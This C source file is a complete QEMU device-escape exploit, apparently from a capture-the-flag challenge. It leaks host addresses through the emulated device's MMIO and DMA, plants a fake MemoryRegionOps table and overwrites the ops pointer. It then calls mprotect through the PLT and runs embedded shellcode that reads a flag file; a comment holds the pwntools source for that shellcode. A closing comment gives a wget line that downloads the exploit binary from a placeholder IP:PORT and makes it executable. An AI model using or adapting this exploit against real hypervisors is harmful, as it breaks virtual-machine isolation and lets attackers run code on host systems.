#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <inttypes.h>
#include <fcntl.h>
#include <unistd.h>

#define MMIO_BEGIN 0x00000000febd0000
#define MMIO_SIZE  (0x00000000febdffff - 0x00000000febd0000 + 1)
#define TRY 200
#define OFFSET_SHELLCODE 0x60

#define PLT_MPROTECT 0x00000000030C404
char *mmio;
int res;

/*
#!/usr/bin/env python2
from pwn import *
context.arch = "amd64"
context.bits = 64
flagName = "/home/user/flag"
sc = ''
sc += shellcraft.pushstr(flagName)
sc += shellcraft.open('rsp', 0, None)
sc += shellcraft.read('rax', 'rsp', 100)
sc += shellcraft.write(1, 'rsp', 100)
sc += shellcraft.exit()
a = asm(sc)
print [ord(i) for i in a]
*/
char shellcode[] = {72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 100, 115, 46, 103, 109, 96, 102, 1, 72, 49, 4, 36, 72, 184, 47, 104, 111, 109, 101, 47, 117, 115, 80, 72, 137, 231, 49, 246, 106, 2, 88, 15, 5, 72, 137, 199, 49, 192, 106, 100, 90, 72, 137, 230, 15, 5, 106, 1, 95, 106, 100, 90, 72, 137, 230, 106, 1, 88, 15, 5, 49, 255, 106, 60, 88, 15, 5};

struct __attribute__((aligned(8))) MemoryRegionOps
{
  uint64_t (*read)(void *, uint64_t, unsigned int);
  void (*write)(void *, uint64_t, uint64_t, unsigned int);
  int (*read_with_attrs)(void *, uint64_t, uint64_t *, unsigned int, int);
  int (*write_with_attrs)(void *, uint64_t, uint64_t, unsigned int, int);
  int endianness;
  struct
  {
    unsigned int min_access_size;
    unsigned int max_access_size;
    char unaligned;
    char (*accepts)(void *, uint64_t, unsigned int, char, int);
  } valid;
  struct __attribute__((aligned(4)))
  {
    unsigned int min_access_size;
    unsigned int max_access_size;
    char unaligned;
  } impl;
};

struct MemoryRegionOps fake_mmio_ops = {
    .read = 0xdeadbeef,
    .write = 0xcafecafe,
    .endianness = 0,
    .valid = {
        .min_access_size = 4,
        .max_access_size = 4,
    },
    .impl = {
        .min_access_size = 4,
        .max_access_size = 4,
    },
};

#define X(val, stmt) do {   \
    val = stmt; \
    printf("%p = " #stmt "\n", val);    \
} while (0)

void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

void mmio_write(uint32_t addr, uint32_t val) {
    volatile uint32_t* ptr = mmio + addr;
    *ptr = val;
}

uint64_t mmio_read(uint32_t addr) {
    volatile uint32_t* ptr = mmio + addr;
    return *ptr;
}


void set_src(uint32_t val) {
    mmio_write(4, val);
}

void set_off(uint8_t val) {
    mmio_write(8, val);
}

void pa2qemu() {
    mmio_write(0, 0xdead);
}

void qemu2pa() {
    volatile uint32_t* ptr = mmio;
    uint32_t dummy = *ptr;
}


uint64_t v2p(uint64_t va) {
    int fd;
    uint64_t pa;

    fd = open("/proc/self/pagemap", O_RDONLY);
    lseek(fd, (va >> 12) * 8, SEEK_SET);
    read(fd, &pa, sizeof(pa));

    pa = (pa << 12) + (va & 0xfff);

    // printf("va: %p -> pa: %p\n", va, pa);
    return pa;
}

int main() {
    int memfd, i, j, find = 0, idx0, idx1;
    char *va[TRY], *buf, leak[0xff];
    char *qemu_mmio, *qemu_buf, *qemu_state_base, *qemu_pie_base;
    uint64_t addr, pa[TRY];
    X(memfd, open("/dev/mem", O_SYNC | O_RDWR));
    X(mmio, mmap(NULL, MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, memfd, MMIO_BEGIN));

    for (i = 0; i < TRY; i++) {
        va[i] = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
        va[i][0] = i;
        pa[i] = v2p(va[i]);
    }

    for (i = 0; i < TRY; i++) {
        for (j = i + 1; j < TRY; j++) {
            if (pa[i] - pa[j] == 0x1000) {
                idx0 = j;
                idx1 = i;
                goto find;
            }
            else if (pa[j] - pa[i] == 0x1000) {
                idx0 = i;
                idx1 = j;
                goto find;
            }
        }
    }
    printf("Not found\n");
    exit(1);

find:
    printf("Found\n");
    printf("(%03d) va: %p -> pa: %p\n", idx0, va[idx0], pa[idx0]);
    printf("(%03d) va: %p -> pa: %p\n", idx1, va[idx1], pa[idx1]);
    
    memset(va[idx0], 0x41, 0x1000);
    memset(va[idx1], 0x44, 0x1000);
    
    set_off(0xff);
    set_src(v2p(va[idx0]));
    qemu2pa();

    memcpy(leak, &va[idx1][0x1000 - 0xff], 0xff);
    
    DumpHex(leak, 0xff);
    
    qemu_mmio = *(uint64_t*)&leak[0xc0] - 0xb8;
    qemu_buf = qemu_mmio - 0x2000;
    qemu_state_base = qemu_buf - 0xa30;
    qemu_pie_base = *(uint64_t*)&leak[0x48] - 0x000000000F1FF80;

// qemu leak
    printf("pie: %p\n", qemu_pie_base);
    printf("state: %p\n", qemu_state_base);
    printf("buf: %p\n", qemu_buf);
    printf("mmio: %p\n", qemu_mmio);

// prepare fake mmio ops & shellcode @ buf
    fake_mmio_ops.read = qemu_buf + OFFSET_SHELLCODE;
    fake_mmio_ops.write = qemu_pie_base + PLT_MPROTECT;
    memcpy(&va[idx0][0], &fake_mmio_ops, sizeof(fake_mmio_ops));
    memcpy(&va[idx0][OFFSET_SHELLCODE], &shellcode, sizeof(shellcode));
    set_off(0);
    set_src(v2p(va[idx0]));
    pa2qemu();
    
// overwrite mmio ops
// + align opaque on page boundary
    *(uint64_t*)&va[idx1][0x1000 - 0xff /* mmio */ + 0x48] = qemu_buf;
    *(uint64_t*)&va[idx1][0x1000 - 0xff /* mmio */ + 0x50] = ((uint64_t)qemu_buf - 0x2000) & ~0xfff;
    set_off(0xff);
    set_src(v2p(va[idx0]));
    pa2qemu();

// trigger mprotect & shellcode
    scanf("%*c");
    mmio_write(0x5000, 7); // mprotect(state, 0x5000, RWX)
    scanf("%*c");
    mmio_read(0);
}

/*
rm ex ; wget http://IP:PORT/ex ; chmod +x ./ex; 
read = 0x000000000081B210
write = 0x000000000081B508
*/
